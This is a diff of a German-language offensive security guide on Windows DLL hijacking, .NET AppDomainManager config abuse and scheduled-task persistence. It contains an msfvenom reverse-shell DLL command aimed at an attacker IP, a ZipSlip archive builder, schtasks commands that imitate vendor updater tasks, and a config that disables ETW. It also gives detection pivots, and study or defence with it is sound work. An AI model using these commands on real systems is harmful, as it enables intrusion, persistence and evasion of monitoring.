@@ -5,23 +5,23 @@
 
 ## Basic Information
 
-DLL Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Er wird hauptsächlich für Code Execution, das Erreichen von Persistenz und seltener für Privilege Escalation genutzt. Trotz des hierigen Fokus auf Escalation bleibt die Hijacking-Methode über alle Ziele hinweg gleich.
+DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Er wird hauptsächlich für Codeausführung, zur Erreichung von Persistenz und, seltener, zur Privilege Escalation verwendet. Trotz des hier liegenden Fokus auf Escalation bleibt die Hijacking-Methode über die Ziele hinweg konsistent.
 
 ### Common Techniques
 
-Für DLL Hijacking werden mehrere Methoden eingesetzt, deren Wirksamkeit von der DLL-Load-Strategie der Anwendung abhängt:
+Für DLL Hijacking werden mehrere Methoden eingesetzt, wobei ihre Wirksamkeit von der DLL-Loading-Strategie der Anwendung abhängt:
 
-1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu erhalten.
-2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL und Ausnutzen des Suchmusters der Anwendung.
-3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL für eine Anwendung, damit sie diese lädt, weil sie denkt, es handle sich um eine nicht vorhandene erforderliche DLL.
-4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local` Dateien, um die Anwendung auf die bösartige DLL umzuleiten.
-5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
+1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
+2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen und Ausnutzen des Suchmusters der Anwendung.
+3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL für eine Anwendung, die davon ausgeht, dass es sich um eine nicht vorhandene, benötigte DLL handelt.
+4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local` Dateien, um die Anwendung zur bösartigen DLL umzuleiten.
+5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading in Verbindung gebracht wird.
 6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich wie bei Binary Proxy Execution Techniken.
 
 
 ### AppDomainManager hijacking (`<exe>.config` + attacker assembly)
 
-Klassisches DLL sideloading ist nicht der einzige Weg, um einen vertrauenswürdigen **.NET Framework** Prozess dazu zu bringen, Attacker-Code zu laden. Wenn die Ziel-EXE eine **managed** Anwendung ist, prüft die CLR auch eine **application configuration file**, die nach der EXE benannt ist (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die config auf eine vom Angreifer kontrollierte assembly verweist, die neben der EXE abgelegt ist, lädt die CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.
+Classic DLL sideloading ist nicht der einzige Weg, um einen vertrauenswürdigen **.NET Framework** Prozess dazu zu bringen, Code eines Angreifers zu laden. Wenn die Ziel-Executable eine **managed** Anwendung ist, konsultiert das CLR außerdem eine **application configuration file**, die nach der Executable benannt ist (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die config auf eine vom Angreifer kontrollierte assembly verweist, die neben der EXE abgelegt wurde, lädt das CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.
 
 Laut dem .NET Framework configuration schema von Microsoft müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.
 
@@ -45,112 +45,140 @@ MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0
 }
 ```
 Praktische Hinweise:
-- Das ist **.NET Framework-spezifische** Tradecraft. Es hängt vom CLR-Config-Parsing ab, nicht von der Win32 DLL search order.
-- Der Host muss wirklich eine **managed EXE** sein. Schnelle Prüfung: `sigcheck -m target.exe`, `corflags target.exe`, oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
-- Der Config-Dateiname muss exakt zum Namen der ausführbaren Datei passen (`<binary>.config`) und liegt normalerweise **direkt neben der EXE**.
-- Das ist nützlich bei **signierten Microsoft/vendor binaries**, weil die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed assembly im selben Prozess ausgeführt wird.
-- Wenn du bereits ein beschreibbares Installer-/Update-Verzeichnis hast, kann AppDomainManager hijacking als **erste Stufe** verwendet werden, gefolgt von klassischem DLL sideloading oder reflective loading für spätere Stufen.
+- Dies ist **.NET Framework-spezifisches** Tradecraft. Es hängt vom CLR config parsing ab, nicht von der Win32 DLL search order.
+- Der Host muss wirklich eine **managed EXE** sein. Schneller Check: `sigcheck -m target.exe`, `corflags target.exe` oder nach dem **CLR Runtime Header** in den PE metadata suchen.
+- Der config-Dateiname muss exakt zum Exe-Namen passen (`<binary>.config`) und liegt normalerweise **direkt neben der EXE**.
+- Das ist nützlich mit **signierten Microsoft/vendor binaries**, weil die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed assembly in-process ausgeführt wird.
+- Wenn du bereits ein beschreibbares installer/update-Verzeichnis hast, kann AppDomainManager hijacking als **erste Stufe** verwendet werden, gefolgt von classic DLL sideloading oder reflective loading für spätere Stufen.
 
-### Vorhandene Scheduled Task hijacken, um die sideload chain erneut zu starten
+### AppDomainManager als downloader + scheduled-task bootstrap
 
-Für Persistence nicht nur nach dem **Erstellen einer neuen Task** suchen. Manche intrusion sets warten, bis ein legitimer Installer eine **normale updater task** erstellt, und **schreiben dann die task action um**, sodass Name, Author und Trigger weiterhin für Defenders vertraut aussehen.
+Ein praktisches intrusion pattern ist, die vertrauenswürdige managed EXE mit sowohl einer bösartigen `*.config` als auch einer bösartigen AppDomainManager DLL zu kombinieren, die nur als **kleiner bootstrapper** dient:
+
+1. Der User startet einen signierten .NET installer oder updater von einem glaubwürdigen Ort wie `%USERPROFILE%\Downloads`.
+2. Die danebenliegende config veranlasst den CLR, die attacker assembly **vor** dem Start der legitimen app logic zu laden.
+3. Der bösartige manager führt eine **path gate** durch (zum Beispiel nur fortfahren, wenn die host EXE aus `Downloads` läuft, und die zweite Stufe nur von `%LOCALAPPDATA%` aus erlauben).
+4. Wenn der Check besteht, lädt er das eigentliche payload in einen user-writable path wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet persistence mit einem scheduled task ein.
+
+Warum diese Variante wichtig ist:
+- Die signierte Host EXE bleibt unverändert, sodass Triage, die nur die main binary hasht, den compromise übersehen kann.
+- Einfache **path-based anti-analysis** ist üblich: Das Verschieben des ZIP/EXE/DLL-Trios auf Desktop, Temp oder einen sandbox path kann die Kette absichtlich brechen.
+- Die erste Stufe der AppDomainManager DLL kann klein und unauffällig bleiben, während das eigentliche implant später abgerufen wird.
+
+Minimal persistence example, das bei diesem pattern häufig zu sehen ist:
+```cmd
+schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
+```
+Hinweise:
+- ` /rl highest` bedeutet **höchste verfügbare** für diesen Benutzer/diese Sitzung; es ist nicht automatisch eine SYSTEM-Eskalation.
+- Diese Technik ist oft besser als **execution/persistence via .NET config abuse** einzuordnen als als klassisches missing-DLL search-order hijacking, obwohl Operatoren beides häufig miteinander verketten.
+
+Detection-Pivots:
+- Signierte .NET-Exes, die aus **ZIP extraction paths**, `Downloads`, `%TEMP%` oder anderen user-writable folders gestartet werden, mit einer **colocated** `<exe>.config`.
+- Neue scheduled tasks, deren action auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` zeigt und deren Namen Browser-/Vendor-Updater imitieren.
+- Kurzlebige managed bootstrap processes, die sofort eine andere EXE herunterladen und dann `schtasks.exe` starten.
+- Samples, die frühzeitig beenden, außer der executable path entspricht einem erwarteten user-profile directory.
+
+### Hijacking an existing scheduled task to relaunch the sideload chain
+
+Für persistence solltest du nicht nur nach dem **Erstellen eines neuen Tasks** suchen. Einige intrusion sets warten, bis ein legitimer Installer einen **normalen updater task** erstellt, und **schreiben dann die task action um**, sodass Name, Author und Trigger für Defender vertraut bleiben.
 
 Wiederverwendbarer Workflow:
-1. Die legitime Software installieren/ausführen und die Task identifizieren, die sie normalerweise erstellt.
-2. Das Task-XML exportieren und die aktuellen Werte von `<Exec><Command>` / `<Arguments>` notieren.
-3. Nur die Action ersetzen, sodass die Task deine **trusted host EXE** aus einem user-writable staging directory startet, die dann die echte payload per side-load oder per AppDomain lädt.
-4. Dieselbe Task mit demselben Namen erneut registrieren, statt ein neues, offensichtliches Persistence-Artefakt zu erstellen.
+1. Installiere/Starte die legitime Software und identifiziere den Task, den sie normalerweise erstellt.
+2. Exportiere die task XML und notiere die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.
+3. Ersetze nur die action, sodass der Task deine **trusted host EXE** aus einem user-writable staging directory startet, die dann das echte payload per side-load oder AppDomain-load lädt.
+4. Registriere denselben task name erneut, anstatt ein neues offensichtliches persistence artifact zu erstellen.
 ```cmd
 schtasks /query /tn "<TaskName>" /xml > task.xml
 :: edit the <Exec><Command> and optional <Arguments> nodes
 schtasks /create /tn "<TaskName>" /xml task.xml /f
 ```
 Warum es stealthier ist:
-- Der Task-Name kann weiterhin legitim aussehen (zum Beispiel ein Vendor-Updater).
-- Der **Task Scheduler service** startet ihn, sodass Parent-/Ancestor-Validierung oft die erwartete Scheduling-Chain sieht statt `explorer.exe`.
-- DFIR-Teams, die nur nach **neuen Task-Namen** suchen, übersehen möglicherweise einen Task, dessen Registrierung schon existierte, dessen Aktion aber jetzt auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen attacker-controlled path zeigt.
+- Der Task-Name kann weiterhin legitim aussehen (zum Beispiel wie ein Vendor-Updater).
+- Der **Task Scheduler service** startet ihn, daher sieht die Parent-/Ancestor-Validierung oft die erwartete Scheduling-Kette statt `explorer.exe`.
+- DFIR-Teams, die nur nach **neuen Task-Namen** suchen, übersehen möglicherweise einen Task, dessen Registrierung bereits existierte, dessen Action jetzt aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen attacker-kontrollierten Pfad zeigt.
 
 Schnelle Hunting-Pivots:
 - `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
 - `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
-- Vergleiche `C:\Windows\System32\Tasks\*` XML und `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` Metadata gegen eine Baseline.
-- Alarme auslösen, wenn ein **vendor-looking updater task** aus **user-writable directories** ausgeführt wird oder eine .NET EXE mit einer colocated `*.config` Datei startet.
+- Vergleiche `C:\Windows\System32\Tasks\*` XML und `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` Metadaten mit einem Baseline-Stand.
+- Alerten, wenn ein **Vendor-looking updater task** aus **user-writable directories** ausgeführt wird oder eine .NET EXE mit einer lokal vorhandenen `*.config` Datei startet.
 
 > [!TIP]
-> Für eine Step-by-step Chain, die HTML staging, AES-CTR configs und .NET implants auf DLL sideloading aufsetzt, lies den Workflow unten.
+> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR configs und .NET implants zusätzlich zu DLL sideloading kombiniert, siehe den Workflow unten.
 
 {{#ref}}
 advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Finden fehlender Dlls
+## Finding missing Dlls
 
-Der häufigste Weg, fehlende Dlls in einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals auszuführen und die **folgenden 2 Filter** zu setzen:
+Der häufigste Weg, fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aus sysinternals und das **Setzen** der **folgenden 2 Filter**:
 
 ![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)
 
 ![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)
 
-und nur die **File System Activity** anzuzeigen:
+und dann nur die **File System Activity** anzeigen:
 
 ![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)
 
-Wenn du nach **fehlenden dlls allgemein** suchst, lässt du dies für einige **Sekunden** laufen.\
-Wenn du nach einer **fehlenden dll in einer bestimmten ausführbaren Datei** suchst, solltest du einen **weiteren Filter wie "Process Name" "contains" `<exec name>`** setzen, sie ausführen und dann die Event-Erfassung stoppen.
+Wenn du nach **fehlenden dlls im Allgemeinen** suchst, lässt du das für ein paar **Sekunden** laufen.\
+Wenn du nach einer **fehlenden dll innerhalb einer bestimmten Executable** suchst, solltest du einen **weiteren Filter wie "Process Name" "contains" `<exec name>`** setzen, sie ausführen und dann das Erfassen der Events stoppen.
 
-## Ausnutzen fehlender Dlls
+## Exploiting Missing Dlls
 
-Um Privilegien zu eskalieren, ist unsere beste Chance, **eine dll schreiben zu können, die ein privilegierter Prozess laden will**, und zwar an einem **Ort, an dem danach gesucht wird**. Daher können wir entweder eine dll in einen **Ordner schreiben, der vor** dem Ordner mit der **originalen dll** durchsucht wird (Sonderfall), oder wir können in einen Ordner schreiben, in dem nach der dll gesucht wird, während die originale **dll** in keinem Ordner existiert.
+Um Privilegien zu erhöhen, ist unsere beste Chance, eine **dll schreiben zu können, die ein privilegierter Prozess zu laden versucht**, an einem Ort, an dem nach ihr gesucht wird. Daher können wir entweder eine **dll** in einen **Ordner** schreiben, in dem die **dll vor** dem Ordner mit der **original dll** gesucht wird (Sonderfall), oder wir können in einen Ordner schreiben, in dem nach der dll gesucht wird, während die originale **dll** in keinem Ordner existiert.
 
 ### Dll Search Order
 
-**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kannst du genau sehen, wie Dlls geladen werden.**
+**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kannst du sehen, wie Dlls konkret geladen werden.**
 
-**Windows applications** suchen nach DLLs über eine Reihe von **vordefinierten Suchpfaden** in einer bestimmten Reihenfolge. Das Problem des DLL hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der echten DLL geladen wird. Eine Lösung, um das zu verhindern, ist, dass die Anwendung beim Verweis auf die benötigten DLLs absolute Pfade verwendet.
+**Windows applications** suchen nach DLLs anhand einer Reihe von **vordefinierten Suchpfaden** in einer bestimmten Reihenfolge. Das Problem von DLL hijacking entsteht, wenn eine bösartige DLL gezielt in einem dieser Verzeichnisse platziert wird, damit sie vor der legitimen DLL geladen wird. Eine Lösung dagegen ist, dass die Anwendung beim Verweis auf benötigte DLLs absolute Pfade verwendet.
 
-Die **DLL search order auf 32-bit** Systemen sieht so aus:
+Unten siehst du die **DLL search order auf 32-bit** Systemen:
 
 1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
-2. Das system directory. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
-3. Das 16-bit system directory. Es gibt keine Funktion, um den Pfad dieses Verzeichnisses zu ermitteln, aber es wird durchsucht. (_C:\Windows\System_)
-4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.
+2. Das system directory. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
+3. Das 16-bit system directory. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses ermittelt, aber es wird durchsucht. (_C:\Windows\System_)
+4. Das Windows directory. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses zu erhalten.
 1. (_C:\Windows_)
 5. Das aktuelle Verzeichnis.
-6. Die Verzeichnisse, die in der PATH environment variable aufgelistet sind. Beachte, dass dies nicht den per-application path umfasst, der im **App Paths** registry key angegeben ist. Der **App Paths** key wird bei der Berechnung des DLL search path nicht verwendet.
+6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachte, dass dies nicht den per-application path einschließt, der über den Registry-Key **App Paths** angegeben wird. Der Key **App Paths** wird bei der Berechnung des DLL search path nicht verwendet.
 
-Das ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn er deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (default ist aktiviert).
+Das ist die **default** Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn er deaktiviert ist, rückt das aktuelle Verzeichnis an zweite Stelle. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (default ist aktiviert).
 
-Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.
+Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des Executable-Moduls, das **LoadLibraryEx** lädt.
 
-Beachte außerdem, dass **eine dll über den absoluten Pfad statt nur über den Namen geladen werden kann**. In diesem Fall wird diese dll **nur in diesem Pfad gesucht** (wenn die dll Abhängigkeiten hat, werden diese wie gerade per Name geladen gesucht).
+Beachte außerdem, dass eine **dll** durch Angabe des absoluten Pfads statt nur des Namens geladen werden kann. In diesem Fall wird diese dll **nur in diesem Pfad gesucht** (wenn die dll Abhängigkeiten hat, werden diese so gesucht, als wären sie gerade per Name geladen worden).
 
 Es gibt noch andere Möglichkeiten, die Suchreihenfolge zu verändern, aber ich werde sie hier nicht erklären.
 
-### Verkettung eines arbitrary file write zu einem missing-DLL hijack
+### Chaining an arbitrary file write into a missing-DLL hijack
 
-1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht findet.
-2. Wenn die Binary nach Zeitplan/über einen Dienst läuft, wird eine DLL mit einem dieser Namen in das **application directory** zu droppen (Suchreihenfolge-Eintrag #1) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess vor dem Laden der echten Kopie aus `C:\Program Files\dotnet\fxr\...` nach `hostfxr.dll` in `C:\samples\app\`.
-3. Baue eine Payload-DLL (z. B. reverse shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
-4. Wenn dein Primitive ein **ZipSlip-style arbitrary write** ist, erstelle ein ZIP, dessen Entry aus dem extraction dir ausbricht, sodass die DLL im App-Ordner landet:
+1. Verwende **ProcMon**-Filter (`Process Name` = target EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, die der Prozess anfragt, aber nicht findet.
+2. Wenn das Binary nach einem **schedule/service** läuft, wird das Ablegen einer DLL mit einem dieser Namen in das **application directory** (search-order-Eintrag #1) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess nach `hostfxr.dll` in `C:\samples\app\` bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
+3. Erstelle eine Payload DLL (z. B. reverse shell) mit irgendeinem Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
+4. Wenn dein Primitive ein **ZipSlip-style arbitrary write** ist, baue ein ZIP, dessen Entry aus dem extraction dir ausbricht, sodass die DLL im App-Ordner landet:
 ```python
 import zipfile
 with zipfile.ZipFile("slip-shell.zip", "w") as z:
 z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
 ```
-5. Liefere das Archiv an den überwachten Inbox/share; wenn der geplante Task den Prozess erneut startet, lädt er die malicious DLL und führt deinen Code als der service account aus.
+5. Liefere das Archiv an den überwachten Inbox/Share; wenn die geplante Aufgabe den Prozess erneut startet, lädt sie die bösartige DLL und führt deinen Code als das Servicekonto aus.
 
 ### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath
 
-Ein fortgeschrittener Weg, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, das Feld DllPath in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen APIs von ntdll zu setzen. Wenn hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und keine Verwendung der safe loading flags), dazu gezwungen werden, eine malicious DLL aus diesem Verzeichnis zu laden.
+Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen, wenn der Prozess mit den nativen APIs von ntdll erstellt wird. Indem du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und ohne die sicheren Ladeflags zu verwenden), dazu gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.
 
 Key idea
-- Erzeuge die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein dropper/unpacker liegt).
-- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Zielbinary eine DLL per Name auflöst, prüft der Loader diesen übergebenen DllPath während der Auflösung und ermöglicht so zuverlässiges sideloading, selbst wenn sich die malicious DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.
+- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein Dropper/Unpacker liegt).
+- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Ziel-Binärdatei eine DLL per Name auflöst, konsultiert der Loader während der Auflösung dieses übergebene DllPath, wodurch zuverlässiges sideloading möglich wird, selbst wenn die bösartige DLL nicht im selben Verzeichnis wie die Ziel-EXE liegt.
 
 Notes/limitations
-- Dies betrifft den zu erstellenden Child Process; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
-- Das Ziel muss eine DLL per Name importieren oder mit LoadLibrary laden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
-- KnownDLLs und hart codierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Priorität verändern.
+- Dies wirkt sich auf den gerade erstellten Child-Prozess aus; es ist nicht dasselbe wie SetDllDirectory, das nur den aktuellen Prozess betrifft.
+- Das Ziel muss eine DLL per Name importieren oder mit LoadLibrary laden (kein absoluter Pfad und ohne LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
+- KnownDLLs und hart kodierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Priorität verändern.
 
 Minimal C example (ntdll, wide strings, simplified error handling):
 
@@ -229,23 +257,23 @@ return 0;
 </details>
 
 Operational usage example
-- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
-- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
+- Platziere eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder die echte weiterleitet) in deinem DllPath-Verzeichnis.
+- Starte eine signierte Binary, von der bekannt ist, dass sie xmllite.dll per Name über die obige Technik sucht. Der loader löst den Import über den angegebenen DllPath auf und sideloads deine DLL.
 
-This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
+Diese Technik wurde in-the-wild beobachtet, um mehrstufige sideloading-Ketten aufzubauen: Ein initialer launcher legt eine Helper-DLL ab, die dann eine Microsoft-signierte, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem staging-Verzeichnis zu erzwingen.
 
 
 ### .NET AppDomainManager hijacking via `.exe.config`
 
-For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.
+Für **.NET Framework**-Targets kann sideloading **vor `Main()`** ohne Memory-Patching erfolgen, indem die benachbarte **`.exe.config`**-Datei der Anwendung missbraucht wird. Anstatt sich nur auf die Win32 DLL search order zu verlassen, platziert der Angreifer eine legitime .NET EXE neben einer bösartigen Konfiguration und einer oder mehreren vom Angreifer kontrollierten assemblies.
 
-How the chain works:
-1. The host EXE starts and the **CLR reads `<exe>.config`**.
-2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
-3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
-4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.
+So funktioniert die Kette:
+1. Die Host-EXE startet und der **CLR liest `<exe>.config`**.
+2. Die Konfiguration setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, sodass die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
+3. Der bösartige Manager erhält **pre-`Main()` execution** innerhalb des vertrauenswürdigen Host-Prozesses.
+4. Dieselbe Konfiguration kann den CLR zwingen, lokale assemblies zuerst aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) und kann Runtime-Validierung/Telemetry ohne inline patching abschwächen.
 
-Campaign-style pattern (exact nesting can vary by directive / CLR version):
+Campaign-style pattern (genaue Verschachtelung kann je nach directive / CLR-Version variieren):
 ```xml
 <configuration>
 <runtime>
@@ -264,43 +292,43 @@ Campaign-style pattern (exact nesting can vary by directive / CLR version):
 </configuration>
 ```
 Warum das nützlich ist:
-- **`<probing privatePath="."/>`** hält die assembly resolution im Anwendungsverzeichnis und macht den Ordner zu einer vorhersagbaren sideloading surface.
-- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Code des Angreifers, bevor die legitime App-Logik läuft.
-- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-App erlauben, unsignierte oder manipulierte Assemblies ohne strong-name validation failure zu laden.
-- **`<publisherPolicy apply="no"/>`** vermeidet publisher-policy redirects zu neueren assemblies.
-- **`<requiredRuntime ... safemode="true"/>`** macht die runtime selection deterministischer.
-- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit** direkt über die Konfiguration deaktiviert, statt dass das Implantat `EtwEventWrite` im Speicher patcht.
+- **`<probing privatePath="."/>`** hält die assembly resolution im Anwendungsverzeichnis und macht den Ordner zu einer vorhersehbaren sideloading surface.
+- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifer-Code, bevor die legitime App-Logik läuft.
+- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann es einer Full-Trust-App erlauben, unsignierte oder manipulierte assemblies ohne strong-name validation failure zu laden.
+- **`<publisherPolicy apply="no"/>`** vermeidet publisher-policy redirects auf neuere assemblies.
+- **`<requiredRuntime ... safemode="true"/>`** macht die runtime selection vorhersehbarer.
